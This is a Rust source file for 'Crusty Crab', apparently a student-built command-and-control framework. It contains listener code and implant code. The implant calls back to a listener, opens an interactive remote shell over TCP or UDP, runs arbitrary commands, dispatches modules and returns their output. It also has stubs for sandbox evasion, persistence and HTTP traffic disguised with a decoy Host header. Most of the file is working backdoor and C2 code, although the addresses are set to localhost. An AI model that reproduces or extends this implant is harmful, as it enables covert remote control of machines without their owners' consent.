/* CRUSTY CRAB API
 * Authors: Robert Heine, Alexander Schmith, Chandler Hake
 * Source: https://github.com/AlexSchmith/CrustyCrab
 */

// Ignore Warnings
#![allow(unused_variables)]
#![allow(unused_mut)]
#![allow(unused_imports)]
#![allow(unused_must_use)]
#![allow(unused_assignments)]
#![allow(unreachable_code)]
#![allow(dead_code)]

/* MODULES
 * Includes the user-made modules within the program
 */

mod usr_mods;

/* IMPORTS
 */

use std::process::Command;
use std::net::{UdpSocket, SocketAddr, TcpListener, TcpStream, Shutdown};
use std::io::{Read, Write};
use std::format;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use std::thread;
use std::path::Path;
use std::str;

/*****************************/
/*     USEFUL STRUCTURES     */
/*****************************/

pub struct SystemInfo {
    arch: String,
    os: String,
    hostname: String,
}

// Structure for a network listener
// contains both a UDP and TCP socket to be used as needed
// contains an ID value to uniquely identify each listener
pub struct Listener {
    // Option wrappers used for support of None type object
    pub udp_sock: Option<UdpSocket>,
    pub tcp_sock: Option<TcpListener>,
    pub id: u64,
    // 0 for idle, 1 for listening, 2 for connected
    pub status: u8,
}

// Creates a blank listener
pub fn new_lsn(i: u64) -> Listener {
    let ret = Listener {
        udp_sock: None,
        tcp_sock: None,
        id: i,
        status: 0,
    };
    return ret;
}

// Used for transferring information between threads
// control code used for giving commands
// buff used for sharing data as byte vectors
pub struct SharedBuffer {
    pub cc: u8,
    pub buff: Vec<u8>,
}

// Spawns a new listener
// dispatches using a match statement to different functions based on what protocol is used
pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
    match protocol {
        "udp" => listen_udp(lsn, address, sb),
        "tcp" => listen_tcp(lsn, address, sb),
        "http" => listen_tcp(lsn, address, sb),
        "dns" => listen_udp(lsn, address, sb),
        &_ => todo!(),
    }
}

/****************************/
/*     LISTENER METHODS     */
/****************************/

// listens using a TcpListener
// Begins in listneing mode (passively listens for connections from implants)
// once connection with implant is established, swap to interact mode and interact with the implant
//     for interact mode, see interact_tcp()
fn listen_tcp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
    lsn.status = 1; // listening mode
    lsn.tcp_sock = Some(TcpListener::bind(address).unwrap());
    println!("[+] Opening TCP listener on port {}", address.port());
    loop {
        // Checks for commands from the client each iteration
        let cmd: u8 = rcv_client_command(lsn, sb);
        if cmd == 2 { // 2 means terminate connection and kill listener
            break;
        }

        // attempt to accept TCP connections
        let acpt = lsn.tcp_sock.as_ref().expect("tcp listener not initialized").accept();
        match acpt {
            // on a success, checks to see if "order up" was sent. if so, accept connection
            Ok((mut stream, _address)) => {
                let mut buffer = [0; 32768];
                let bytes = stream.read(&mut buffer[..]).unwrap();

                // replace insides of .contains() with whatever string/key we are using to verify connection
                if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
                    lsn.status = 2; // interact mode
                    stream.write("order recieved".as_bytes()).unwrap();
                    // switches to interact mode
                    interact_tcp(lsn, &mut stream, sb);
                    lsn.status = 1; // back to listening mode
                }
                stream.shutdown(Shutdown::Both).expect("shutdown call failed");
            }
            Err(e) => { /* Connection failed, nothing to do here. */ }
        }
    }
    lsn.status = 0; // listener not running (dormant)
}

// listens using a UdpSocket
// Begins in listening mode (passively listens for connections from implants)
// once connection with implant is established, swap to interact mode and interact with the implant
//     for interact mode, see interact_udp()
fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
    // Setup socket to listen for implant connection
    lsn.status = 1;
    lsn.udp_sock = Some(UdpSocket::bind(address).expect("Couldnt bind address"));
    lsn.udp_sock.as_ref().expect("udp socket not initialized").set_read_timeout(Some(Duration::from_millis(5))).expect("set_read_timeout failed");
    println!("[+] Opening UDP listener on port {}", address.port());
    loop {
        // Checks for commands from the client each iteration
        let cmd: u8 = rcv_client_command(lsn, sb);
        if cmd == 2 { // 2 means terminate connection and kill listener
            break;
        }

        // attempt to read from socket to verify a connection
        let mut buffer = [0; 32768];
        let (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer) {
            Ok((b, s)) => (b, s),
            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
        };
        // checks to see if bytes were recieved, and if so checks for "order up" to verify connection
        if bytes != 0 && String::from_utf8_lossy(&mut buffer[..]).contains("order up") {
            lsn.status = 2; // interact mode
            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to("order recieved".as_bytes(), src);
            // switches to interact mode
            interact_udp(lsn, src, sb);
            lsn.status = 1; // back to listening mode
        }
    }
    lsn.status = 0; // listener not running (dormant)
}

// handles interaction with the implant via UDP
// acts as a middleman between the implant and client
// Control Codes:
// 69 => exit shell (if in one)
// 3 => terminate connection with implant and revert back to listening mode
// 4 => Send a single command for the implant to execute
// 5 => Start up a shell
// 6 => Have the implant execute a module
// anything else => do nothing (sleep for 10 ms to allow client to unlock shared buffer)
fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>) {
    println!("\n[+] Connection established by listener {}", lsn.id + 1);
    let mut is_interacting: bool = false;
    // memo keeps track of the last String contained within the shared buffer
    // used so that listener can check to see if shared buffer has been read from or written to by client
    let mut memo: String = String::new();
    loop {
        // live interaction with the implant shell
        if is_interacting {
            // checks if client is terminating interaction with target_src
            let cc: u8 = rcv_client_command(lsn, sb);
            if cc == 69 {
                is_interacting = false;
                let code: u8 = 69;
                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
            }
            // otherwise interact with shell normally
            // simply being a middleman between client and implant
            else {
                let mut sb_copy = sb.lock().unwrap();
                if !vec_is_zero(&sb_copy.buff) && !String::from_utf8_lossy(&sb_copy.buff).to_string().eq(&memo){
                    // send null byte to indicate no change in cc
                    let code: u8 = 0;
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                    // now send input from client to implant
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
                    // recieve output from implant
                    let mut output = [0; 32768];
                    let (mut bytes, mut src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output) {
                        Ok((b, s)) => (b, s),
                        Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                    };
                    // waits until output from implant has been recieved
                    while bytes == 0 {
                        (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output) {
                            Ok((b, s)) => (b, s),
                            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                        };
                    }
                    // fill the shared buffer for the client to read from
                    sb_copy.buff = output.to_vec();
                    // set the memo
                    memo = String::from_utf8_lossy(&sb_copy.buff).to_string();
                }
            }
        }
        // non-shell based interaction
        else {
            // check for client commands
            let cc: u8 = rcv_client_command(lsn, sb);
            match cc {
                // go back to listening mode
                3 => {
                    // tell the implant to go dormant
                    let code: u8 = 69;
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                    return;
                },
                // send a single line command to the implant to execute
                4 => {
                    let mut flag: bool = true;
                    // loops until buffer is filled by client
                    while flag {
                        let mut sb_copy = sb.lock().unwrap();
                        // if buffer filled
                        if !vec_is_zero(&sb_copy.buff) {
                            // send the proper control code and command as a byte string
                            let code: u8 = 1;
                            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
                            // loop until output is recieved from implant
                            let mut bytes = 0;
                            let mut src = SocketAddr::from(([0, 0, 0, 0], 0));
                            let mut output = [0; 32768];
                            while bytes == 0 {
                                output = [0; 32768];
                                (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output) {
                                        Ok((b, s)) => (b, s),
                                        Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                                };
                            }
                            // once output is recieved, fill the buffer for the client to read from
                            sb_copy.buff = output.to_vec();
                            flag = false;
                        }
                        else {
                            thread::sleep(Duration::from_millis(10));
                        }
                    }
                },
                // tell implant to create a shell and begin interacting with it
                5 => {
                    is_interacting = true;
                    let code: u8 = 2;
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                },
                // tell the shell to execute a module
                6 => {
                    let mut flag: bool = true;
                    // loop until buffer is filled by client
                    while flag {
                        let mut sb_copy = sb.lock().unwrap();
                        // if buffer is filled
                        if !vec_is_zero(&sb_copy.buff) {
                            // send control code and module name as a byte string
                            let code: u8 = 3;
                            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
                            // loop until output is recieved
                            let mut bytes = 0;
                            let mut src = SocketAddr::from(([0, 0, 0, 0], 0));
                            let mut output = [0; 32768];
                            while bytes == 0 {
                                output = [0; 32768];
                                (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output) {
                                        Ok((b, s)) => (b, s),
                                        Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                                };
                            }
                            // once output recieved, fill buffer for client to read from
                            sb_copy.buff = output.to_vec();
                            flag = false;
                        }
                        else {
                            thread::sleep(Duration::from_millis(10));
                        }
                    }
                },
                // anything else, do nothing
                // sleeps for 10ms to allow time for client to unlock mutex if needed
                _u8 => {
                    thread::sleep(Duration::from_millis(10));
                }
            }
        }
    }
}

fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<SharedBuffer>>) {
    println!("[+] Connection established by listener {}", lsn.id);
    let mut is_interacting: bool = false;
    let mut memo: String = String::new();
    loop {
        // live interaction with client
        if is_interacting {
            // checks if client is terminating interaction with target_src
            let cc: u8 = rcv_client_command(lsn, sb);
            if cc == 6 {
                is_interacting = false;
                let code: u8 = 69;
                let bytes = stream.write(&[code; 1]).unwrap();
            }
            // otherwise interact normally
            else {
                let mut sb_copy = sb.lock().unwrap();
                if !vec_is_zero(&sb_copy.buff) && !String::from_utf8_lossy(&sb_copy.buff).to_string().eq(&memo){
                    // send null byte to indicate no change in cc
                    let code: u8 = 0;
                    stream.write(&[code; 1]).unwrap();
                    // now send input
                    stream.write(&sb_copy.buff).unwrap();
                    let mut output = vec![];
                    loop {
                        let mut tmp = [0; 2048];
                        let mut bytes = match stream.read(&mut tmp) {
                            Ok(b) => b,
                            Err(e) => 0,
                        };
                        while bytes == 0 {
                            bytes = match stream.read(&mut output) {
                                Ok(b) => b,
                                Err(e) => 0,
                            };
                        }
                        output.extend_from_slice(&tmp[..2048]);
                        if bytes < 2048 {
                            break;
                        }
                    }
                    sb_copy.buff = output;
                    memo = String::from_utf8_lossy(&sb_copy.buff).to_string();
                }
            }
        }
        else {
            // check for client commands
            let cc: u8 = rcv_client_command(lsn, sb);
            match cc {
                // go back to listening mode
                3 => {
                    // tell the implant to go dormant
                    let code: u8 = 69;
                    stream.write(&[code; 1]).unwrap();
                    return;
                },
                // send a single line command to the implant to execute
                4 => {
                    let mut flag: bool = true;
                    while flag {
                        let mut sb_copy = sb.lock().unwrap();
                        if !vec_is_zero(&sb_copy.buff) {
                            let code: u8 = 1;
                            stream.write(&[code; 1]).unwrap();
                            stream.write(&sb_copy.buff).unwrap();
                            let mut bytes = 0;
                            let mut output = [0; 32768];
                            while bytes == 0 {
                                output = [0; 32768];
                                bytes = match stream.read(&mut output) {
                                        Ok(b) => b,
                                        Err(e) => 0,
                                };
                            }
                            sb_copy.buff = output.to_vec();
                            flag = false;
                        }
                        else {
                            thread::sleep(Duration::from_millis(10));
                        }
                    }
                },
                // tell implant to create a shell and begin interacting with it
                5 => {
                    is_interacting = true;
                    let code: u8 = 2;
                    stream.write(&[code; 1]).unwrap();
                },
                _u8 => {
                    thread::sleep(Duration::from_millis(10));
                }
            }
        }
    }
}

// recieves a single byte from the client: the command code
// this command code, represented as an integer, determines
// what the client wants the listener to do
// anything not explicitly listed below => no command recieved, do nothing
// 1 => send all information about the listener
// 2 => stop listening
// 3 => terminate anchovy connection
// 4 => prepare to send_cmd to an anchovy
// 5 => begin shell on anchovy
// 6 => terminate shell on anchovy
fn rcv_client_command(lsn: &mut Listener, sb: &mut Arc<Mutex<SharedBuffer>>) -> u8 {
    let mut sb_ref = sb.lock().unwrap();
    let cc = sb_ref.cc;
    // only action needed to be taken inside this function is to send back listener info
    if cc == 1 {
        let mut lsn_info = get_lsn_info(lsn);
        // TODO: send lsn_info back to client
    }
    if cc != 5 {
        sb_ref.cc = 0;
    }
    // just for testing
    //println!("Control Code Recieved: {cc}");
    return cc;
}

// Returns a string containing the full info of a given listener
pub fn get_lsn_info(lsn: &mut Listener) -> String {
    let mut stat: &str;
    match lsn.status {
        0 => stat = "Idle",
        1 => stat = "Listening",
        2 => stat = "Bound",
        _u8 => todo!(),
    }
    let id: u64 = lsn.id;
    let mut lsn_info = format!("Listener {id} :: Status - {stat}");
    return lsn_info;
}

/*****************************************/
/*     ENCRYPTION/DECRYPTION METHODS     */
/*****************************************/

// Boiler function for encoding our commands into a dns packet
pub fn encode_dns(){

}

// Boiler function for encoding our commands into a http packet
pub fn encode_http(){
    let method: &str = "POST /searchresult.html HTTP/1.1\r\n";
    let host: &str = "Host: yahoo.com\r\n";
    let ua: &str = "User-Agent: Mozilla/5.0\r\n";
    let at: &str = "Accept-text/xml,text/html,text/plain,image/jpg";
}


// Boiler function for decoding a dns packet for our code to read
pub fn decode_dns(){

}

// Boiler function for decoding an http packet into our own protocol
pub fn decode_http(){

}

/***************************/
/*     IMPLANT METHODS     */
/***************************/

// creates a shell on the target
pub fn udp_shell(sock: &mut UdpSocket) {
    println!("Shell Started!");
    loop {
        // checks if shell is being terminated
        let mut cc = [0; 1];
        let (bytes, src) = match sock.recv_from(&mut cc) {
            Ok((b, s)) => (b, s),
            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
        };
        if cc[0] == 69 {
            break;
        }
        // Otherwise shell it up!
        let mut buffer = [0;32768];
        let (mut bytes, mut src) = (0, SocketAddr::from(([0, 0, 0, 0], 0)));
        loop {
            (bytes, src) = match sock.recv_from(&mut buffer) {
                Ok((b, s)) => (b, s),
                Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
            };
            if bytes > 1 {
                break;
            }
        }
        //Changed to include 1 because there was a bunch
        //being sent that didnt have anything
        let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
        let cmd_out = execute_cmd(cmd);
        sock.send_to(cmd_out.as_bytes(), src);
    }
}

// shell adapted for tcp
pub fn tcp_shell(stream: &mut TcpStream) {
    println!("Shell Started!");
    loop {
        // checks if shell is being terminated
        let mut cc = [0; 1];
        let bytes = match stream.read(&mut cc) {
            Ok(b) => b,
            Err(e) => 0,
        };
        if cc[0] == 69 {
            break;
        }
        // Otherwise shell it up!
        let mut buffer = [0;32768];
        let mut bytes = 0;
        loop {
            bytes = match stream.read(&mut buffer) {
                Ok(b) => b,
                Err(e) => 0,
            };
            if bytes > 1 {
                break;
            }
        }
        //Changed to include 1 because there was a bunch
        //being sent that didnt have anything
        let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
        let cmd_out = execute_cmd(cmd);
        stream.write(cmd_out.as_bytes()).unwrap();
    }
}

// executes a single arbitrary command
pub fn execute_cmd(s: String) -> String {
    if s.trim().contains(' ') {
        let mut split = s.trim().split_whitespace();
        let head = split.next().unwrap();
        let mut tail: Vec<&str> = split.collect();
        tail.pop();
        match head {
            /*"cd" => {
                // TODO
            },*/
            head => {
                let cmd = Command::new(head).args(tail).output();
                match cmd{
                    Ok(c) => return String::from_utf8(c.stdout).expect("Found invalid UTF-8"),
                    Err(e) => return format!("{}", e),
                }
            },
        }
    }
    else {
        //Trim initial string
        let mut tmp = s.trim();
        //Trim all null bytes
        tmp = tmp.trim_matches('\0');
        //Trim remaining whitespace
        tmp = tmp.trim();
        match tmp {
            "exit" => return String::new(),
            tmp => {
                let cmd = Command::new(tmp).output();
                match cmd {
                    Ok(c) => return String::from_utf8(c.stdout).expect("Found invalid UTF-8"),
                    Err(e) => return format!("{}", e),
                }
            }
        }
    }
}

// main method for implants
// dispatches to other methods based on network protocol
pub fn imp_run(protocol: &str, address: SocketAddr) {
    match protocol {
        "udp" => imp_udp(address),
        "tcp" => imp_tcp(address),
        &_ => todo!(),
    }
}

// main for a udp implant
fn imp_udp(lsn_addr: SocketAddr) {
    // sandbox evasion

    // persistence

    // get public facing IP and pick a port, then initialize socket
    // for sake of demos, stick to localhost
    let address = SocketAddr::from(([127, 0, 0, 1], 2973));
    // let address = get_system_addr();
    let mut sock = UdpSocket::bind(address).unwrap();
    sock.set_read_timeout(Some(Duration::from_millis(1000))).expect("set_read_timeout failed");

    // try to connect back to listener
    sock.send_to("order up".as_bytes(), lsn_addr);
    let mut buffer = [0; 32768];
    let (mut bytes, mut src) = (0, SocketAddr::from(([0, 0, 0, 0], 0)));
    loop {
        (bytes, src) = match sock.recv_from(&mut buffer) {
            Ok((b, s)) => (b, s),
            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
        };
        if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order recieved") {
            break;
        }
    }

    println!("Connected");

    // once connected, listen for control code in a loop and use a match to determine what to do
    loop {
        let mut cc = [0; 1];
        let (bytes, src) = match sock.recv_from(&mut cc) {
            Ok((b, s)) => (b, s),
            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
        };
        if bytes > 0 {
            match cc[0] {
                // execute single line cmd
                1 => {
                    buffer = [0; 32768];
                    let (bytes, src) = match sock.recv_from(&mut buffer) {
                        Ok((b, s)) => (b, s),
                        Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                    };
                    if bytes != 0 {
                        let cmd_res: String = execute_cmd(String::from_utf8_lossy(&buffer[..]).as_ref().to_string());
                        sock.send_to(cmd_res.as_bytes(), lsn_addr);
                    }
                },
                // begin shell mode
                2 => udp_shell(&mut sock),
                // execute module
                3 => {
                    buffer = [0; 32768];
                    let (bytes, src) = match sock.recv_from(&mut buffer) {
                        Ok((b, s)) => (b, s),
                        Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                    };
                    if bytes > 0 {
                        let mod_res = usr_mods::dispatch(String::from_utf8_lossy(&buffer[..]).as_ref().to_string());
                        sock.send_to(&mod_res, lsn_addr);
                    }
                },
                _u8 => todo!(),
            }
        }
    }
}

// main for a tcp implant
fn imp_tcp(address: SocketAddr) {
    // sandbox evasion

    // persistence

    // get public facing IP and pick a port, then initialize socket
    // for sake of demos, stick to localhost
    // let address = SocketAddr::from(([127, 0, 0, 1], 2973));
    // let address = get_system_addr();
    let mut sock = TcpStream::connect_timeout(&address, Duration::from_millis(10000)).unwrap();
    sock.set_read_timeout(Some(Duration::from_millis(1000))).expect("set_read_timeout failed");
    // try to connect back to listener
    sock.write("order up".as_bytes());
    let mut buffer = [0; 32768];
    let mut bytes = 0;
    loop {
        bytes = match sock.read(&mut buffer) {
            Ok(b) => b,
            Err(e) => 0,
        };
        if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order recieved") {
            break;
        }
    }

    println!("Connected");

    // once connected, listen for control code in a loop and use a match to determine what to do
    loop {
        let mut cc = [0; 1];
        let bytes = match sock.read(&mut cc) {
            Ok(b) => b,
            Err(e) => 0,
        };
        if bytes != 0 {
            match cc[0] {
                // execute single line cmd
                1 => {
                    buffer = [0; 32768];
                    let bytes = match sock.read(&mut buffer) {
                        Ok(b) => b,
                        Err(e) => 0,
                    };
                    if bytes != 0 {
                        let cmd_res: String = execute_cmd(String::from_utf8_lossy(&buffer[..]).as_ref().to_string());
                    }
                },
                // begin shell mode
                2 => tcp_shell(&mut sock),
                _u8 => todo!(),
            }
        }
    }
}


/*******************************/
/*     MISC HELPER METHODS     */
/*******************************/

// returns true if the vector is all zero
pub fn vec_is_zero(buffer: &Vec<u8>) -> bool {
    for byte in buffer.into_iter() {
        if *byte != 0 {
            return false;
        }
    }
    return true;
}

// returns a SocketAddr containing the public facing IP of the machine and a random unused port
pub fn get_system_addr() -> SocketAddr {
    // replace this with code to find system address
    return SocketAddr::from(([127, 0, 0, 1], 1337));
}
